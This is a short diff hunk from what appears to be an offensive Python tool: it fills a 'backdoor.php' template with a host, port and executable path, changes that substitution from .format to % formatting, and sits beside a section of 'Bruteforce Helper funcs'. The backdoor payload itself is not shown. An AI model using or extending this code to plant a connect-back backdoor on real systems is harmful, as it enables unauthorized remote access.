@@ -51,7 +51,7 @@ temporary = open('selfUpdate.py', mode='r').read()\
             .format(pid=os.getpid(), frozen=frozen, host=host,
                     port=port, exe=sys.executable, arg=sys.argv[0])
 backdoor = open('backdoor.php', mode='r').read()\
-            .format(host, port, os.path.realpath(__file__), host, port)
+            %(host, port, sys.executable, sys.argv[0], host, port)
 
 # Bruteforce Helper funcs
 def product(*args, **kwds):
